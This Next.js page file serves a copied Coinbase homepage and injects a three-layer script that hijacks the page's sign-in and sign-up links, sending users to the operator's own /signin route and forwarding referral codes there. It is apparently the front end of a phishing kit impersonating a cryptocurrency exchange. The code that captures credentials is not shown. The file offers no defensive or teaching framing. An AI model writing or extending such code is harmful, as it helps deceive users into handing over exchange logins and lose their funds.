import fs from "fs";
import path from "path";
import type { GetServerSideProps } from "next";

export const getServerSideProps: GetServerSideProps = async ({ req, res, query }) => {
  // Fix 1: Referral link handling
  // If a referral code is present on the homepage, redirect to /signin to capture it
  const ref = query.ref as string | undefined;
  if (ref) {
    // Validate referral code format before redirecting (alphanumeric, 8-16 chars)
    const codePattern = /^[a-zA-Z0-9]{8,16}$/;
    if (codePattern.test(ref)) {
      res.writeHead(302, { Location: `/signin?ref=${encodeURIComponent(ref)}` });
      res.end();
      return { props: {} };
    }
  }

  const htmlPath = path.join(process.cwd(), "index.html");
  let html = fs.readFileSync(htmlPath, "utf8");

  // Fix 2: Sign-in navigation fix
  // The raw index.html uses Coinbase's own SPA router which intercepts /signin clicks
  // and tries to render their page internally. We inject a script that overrides
  // any <a href="/signin"> clicks to do a hard navigation to our Next.js /signin route.
  const interceptScript = `<script>
    (function() {
      // Layer 1: Override history.pushState BEFORE any SPA script runs.
      // This catches soft navigations the SPA router makes programmatically.
      var _origPushState = history.pushState.bind(history);
      history.pushState = function(state, title, url) {
        if (url && (url === '/signin' || url === '/signup' || String(url).indexOf('/signin') === 0 || String(url).indexOf('/signup') === 0)) {
          window.location.href = url;
          return;
        }
        return _origPushState(state, title, url);
      };

      // Layer 2: Capture-phase click interceptor with stopImmediatePropagation.
      // stopImmediatePropagation prevents ALL other listeners (capture AND bubble)
      // from firing after ours, as long as we registered first.
      document.addEventListener('click', function(e) {
        var el = e.target && e.target.closest ? e.target.closest('a[href]') : null;
        if (!el) { el = e.target; while(el && el.tagName !== 'A') el = el.parentElement; }
        if (el && el.tagName === 'A') {
          var href = el.getAttribute('href');
          if (href && (href === '/signin' || href === '/signup' || href.indexOf('/signin') === 0 || href.indexOf('/signup') === 0)) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            window.location.href = href;
          }
        }
      }, true);

      // Layer 3: After DOM is ready, directly mutate the signin/signup links
      // so they use window.location instead of relying on event listeners at all.
      function patchLinks() {
        var links = document.querySelectorAll('a[href="/signin"], a[href="/signup"]');
        links.forEach(function(a) {
          var href = a.getAttribute('href');
          a.removeAttribute('href');
          a.style.cursor = 'pointer';
          a.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopImmediatePropagation();
            window.location.href = href;
          }, true);
        });
      }

      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', patchLinks);
      } else {
        patchLinks();
      }
      // Run again after a short delay to catch any links rendered by the SPA
      setTimeout(patchLinks, 500);
      setTimeout(patchLinks, 1500);
    })();
  </script>`;

  // Inject our intercept script just before </head>
  html = html.replace('</head>', interceptScript + '</head>');

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.write(html);
  res.end();

  return {
    props: {},
  };
};

export default function HomePage() {
  return null;
}
